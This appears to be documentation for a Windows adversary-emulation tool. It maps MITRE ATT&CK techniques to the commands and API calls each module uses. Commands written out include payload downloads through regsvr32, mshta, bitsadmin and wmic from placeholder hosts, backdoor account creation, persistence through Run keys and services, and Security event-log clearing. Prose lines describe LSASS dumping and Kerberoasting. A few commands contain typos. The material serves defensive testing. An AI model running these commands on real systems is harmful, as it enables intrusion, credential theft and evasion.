Techniques
^^^^^^^^^^

=============================================
Command and Scripting Interpreter: PowerShell
=============================================

T1059.001_

.. _T1059.001: https://attack.mitre.org/techniques/T1059/001/

Variation 1
-----------

| This module uses the Win32 API CreateProcess to execute a specific command: 
| **powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMgAwAA==**

Variation 2
-----------

This module uses the the System.Management.Automation .NET namespace to execute the same script.

========================================================
Command and Scripting Interpreter: Windows Command Shell
========================================================

T1059.003_

.. _T1059.003: https://attack.mitre.org/techniques/T1059/003/

| This module uses the Win32 API CreateProcess to execute a specific command: 
| **cmd.exe /C whoami**

===============================================
Command and Scripting Interpreter: Visual Basic
===============================================

T1059.005_

.. _T1059.005: https://attack.mitre.org/techniques/T1059/005/

| This module uses the Win32 API CreateProcess to execute a specific command: 
| **wscript.exe invoice0420.vbs**


=====================================================
Command and Scripting Interpreter: JavaScript/JScript
=====================================================

T1059.007_

.. _T1059.007: https://attack.mitre.org/techniques/T1059/007/

| This module uses the Win32 API CreateProcess to execute a specific command: 
| **wscript.exe invoice0420.js**

==================================
System Services: Service Execution
==================================

T1569.002_

.. _T1569.002: https://attack.mitre.org/techniques/T1569/002/

| This module uses the Win32 API CreateProcess to execute a specific command: 
| **net start UpdaterService**

===================================
Scheduled Task/Job: Scheduled Task
===================================

T1053.005_

.. _T1053.005: https://attack.mitre.org/techniques/T1053/005/

| This module uses the Win32 API CreateProcess to execute a specific command: 
| **SCHTASKS /CREATE /SC DAILY /TN BadScheduledTask /TR "C:\Windows\Temp\xyz12345.exe" /ST 13:00**


=============================
Create Account: Local Account
=============================

T1136.001_

.. _T1136.001: https://attack.mitre.org/techniques/T1136/001/


Variation 1
-----------

| This module uses the Win32 API NetUserAdd to create a local account.

Variation 2
-----------

| This module uses the Win32 API CreateProcess to execute a specific command: 
| **net user hax0r Passw0rd123El7 /add**

================================================
Create or Modify System Process: Windows Service
================================================
T1543.003_

.. _T1543.003: https://attack.mitre.org/techniques/T1543/003/


Variation 1
-----------

| This module uses the Win32 API CreateService to create a Windows Service.

Variation 2
-----------

| This module uses the Win32 API CreateProcess to execute a specific command: 
| **sc create UpdaterService binpath= C:\Windows\Temp\superlegit.exe type= own start= auto**

====================================================
Boot or Logon Autostart Execution: Registry Run Keys
====================================================
T1547.001_

.. _T1547.001: https://attack.mitre.org/techniques/T1547/001/


Variation 1
-----------

| This module uses the the Microsoft.Win32 .NET namespace to create a Registry Key.

Variation 2
-----------

| This module uses the Win32 API CreateProcess to execute a specific command: 
| **REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V BadApp /t REG_SZ /F /D C:\Windows\Temp\xyz12345.exe**

================================================================================
Event Triggered Execution: Windows Management Instrumentation Event Subscription
================================================================================
T1546.003_

.. _T1546.003: https://attack.mitre.org/techniques/T1546/003/


|  This module uses the System.Management .NET namespace to create the main pieces of a WMI Event Subscription: an Event Filter, an Event Consumer and a FilterToConsumerBinding.

=======================================
Signed Binary Proxy Execution: Regsvr32
=======================================
T1218.010_

.. _T1218.010: https://attack.mitre.org/techniques/T1218/010/


| This module uses the CreateProcess Win32 API to execute
| **regsvr32.exe /u /n /s /i:http://malicious.domain:8080/payload.sct scrobj.dll**


=============================================
Signed Binary Proxy Execution: Regsvcs/Regasm
=============================================
T1218.009_

.. _T1218.009: https://attack.mitre.org/techniques/T1218/009/


| This module uses the CreateProcess Win32 API to execute
| **C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U winword.dll**

==========================================
Signed Binary Proxy Execution: InstallUtil
==========================================
T1218.004_

.. _T1218.004: https://attack.mitre.org/techniques/T1218/004/


| This module uses the CreateProcess Win32 API to execute
| **C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfiles /LogToConsole=alse /U C:\Windows\Temp\XKNqbpzl.exe**

=======================================
Deobfuscate/Decode Files or Information
=======================================
T1140_

.. _T1140: https://attack.mitre.org/techniques/T1140/


| This module uses the CreateProcess Win32 API to execute
| **certutil.exe -decode encodedb64.txt decoded.exe**

====================================
Signed Binary Proxy Execution: Mshta
====================================
T1218.005_

.. _T1218.005: https://attack.mitre.org/techniques/T1218/005/


| This module uses the CreateProcess Win32 API to execute
| **mshta.exe http://webserver/payload.hta**


====================================
Signed Binary Proxy Execution: CMSTP
====================================
T1218.003_

.. _T1218.003: https://attack.mitre.org/techniques/T1218/003/


| This module uses the CreateProcess Win32 API to execute
| **cmstp.exe /s /ns C:\Users\Administrator\AppData\Local\Temp\XKNqbpzl.txt**

=========
BITS Jobs
=========
T1197_

.. _T1197: https://attack.mitre.org/techniques/T1197/


| This module uses the CreateProcess Win32 API to execute
| **bitsadmin.exe /transfer job /download /priority high http://web.evil/sc.exe C:\Windows\Temp\winword.exe**

=======================================
Signed Binary Proxy Execution: Rundll32
=======================================
T1218.011_

.. _T1218.011: https://attack.mitre.org/techniques/T1218/011/

| This module uses the CreateProcess Win32 API to execute
| **rundll32.ex C:\Windows\twain_64.dll**


===================================================
Indicator Removal on Host: Clear Windows Event Logs
===================================================
T1070.001_

.. _T1070.001: https://attack.mitre.org/techniques/T1070/001/

Variation 1
-----------

| This module uses the System.Diagnostics .NET namespace to delete the Security Event Log.

Variation 2
-----------

| This module uses the Win32 API CreateProcess to execute a specific command: 
| **wevtutil.exe cl Security**

=====================
XSL Script Processing
=====================
T1220_

.. _T1220: https://attack.mitre.org/techniques/T1220/

| This module uses the CreateProcess Win32 API to execute
| **wmic.exe os get /FORMAT "http://webserver/payload.xsl":**


================================================
Process Injection: Portable Executable Injection
================================================
T1055.002_

.. _T1055.002: https://attack.mitre.org/techniques/T1055/002/

| This module uses the CreateProcess, OpenProcess, VirtualAllocEx, WriteProcessMemory and CreateRemoteThread Win32 API functions to inject an innocuous shellcode.

==============================================
Process Injection: Asynchronous Procedure Call
==============================================
T1055.004_

.. _T1055.004: https://attack.mitre.org/techniques/T1055/004/

| This module uses the CreateProcess, OpenProcess, VirtualAllocEx, WriteProcessMemory and QueueUserAPC Win32 API functions to inject an innocuous shellcode.

==============================
Brute Force: Password Spraying
==============================
T1110.003_

.. _T1110.003: https://attack.mitre.org/techniques/T1110/003/

Variation 1
-----------

| This module uses the LogonUser Win32 API to test a single password across random users obtained via LDAP.

Variation 2
-----------

| This module uses the WNetAddConnection2 Win32 API to test a single password across random users and random hosts obtained via LDAP.

==============================================
Steal or Forge Kerberos Tickets: Kerberoasting
==============================================
T1558.003_

.. _T1558.003: https://attack.mitre.org/techniques/T1558/003/

| This module uses the KerberosRequestorSecurityToken Class to obtain Kerberos service tickets.

===================================
OS Credential Dumping: LSASS Memory
===================================
T1003.001_

.. _T1003.001: https://attack.mitre.org/techniques/T1003/001/

| This module uses the GetProcessesByName and MiniDumpWriteDump Win32 API functions to create a memory dump of the lsass.exe process.

======================================
System Network Configuration Discovery
======================================
T1016_

.. _T1016: https://attack.mitre.org/techniques/T1016/


| This module uses the CreateProcess Win32 API to execute
| **ipconfig.exe /all"**

============================
File and Directory Discovery
============================
T1083_

.. _T1083: https://attack.mitre.org/techniques/T1083/


| This module uses the CreateProcess Win32 API to execute
| **dir.exe c:\ >> %temp%\download**
| **dir.exe C:\Users\ >> %temp%\download**

=======================
Network Share Discovery
=======================
T1135_

.. _T1135: https://attack.mitre.org/techniques/T1135/

| This module uses the NetShareEnum Win32 API function to enumerate shared on remote endpoints randomly picked using LDAP.

========================
Network Service Scanning
========================
T1046_

.. _T1046: https://attack.mitre.org/techniques/T1046/

| This module uses the  System.Net.Sockets .NET namespace to scan ports on remote endpoints randomly picked using LDAP.

================================
Account Discovery: Local Account
================================
T1087.001_

.. _T1087.001: https://attack.mitre.org/techniques/T1087/001/

| This module uses the CreateProcess Win32 API to execute
| **net.exe user**


=================================
Account Discovery: Domain Account
=================================
T1087.002_

.. _T1087.002: https://attack.mitre.org/techniques/T1087/002/

Variation 1
-----------

| This module uses the Sytem.DirectoryServices .NET NameSpace to query a domain environment using LDAP.

Variation 2
-----------

| This module uses the CreatePRocess Win32 API to execute:
| **net.exe user /domain**

========================
System Service Discovery
========================
T1007_

.. _T1007: https://attack.mitre.org/techniques/T1007/

| This module uses the CreateProcess Win32 API to execute
| **net.exe start**
| **tasklist.exe /svc**

===========================
System Owner/User Discovery
===========================
T1033_

.. _T1033: https://attack.mitre.org/techniques/T1033/

| This module uses the CreateProcess Win32 API to execute
| **whoami.exe**
| **query user**

====================================
System Network Connections Discovery
====================================
T1049_

.. _T1049: https://attack.mitre.org/techniques/T1049/

| This module uses the CreateProcess Win32 API to execute
| **netstat.exee**
| **net.exe use**
| **net.exe sessions**

==========================================
Remote Services: Windows Remote Management
==========================================
T1021.006_

.. _T1021.006: https://attack.mitre.org/techniques/T1021/006/

| This module uses System.Management.Automation .NET namespace to execute commands on randomly picked remote hosts using WinRM.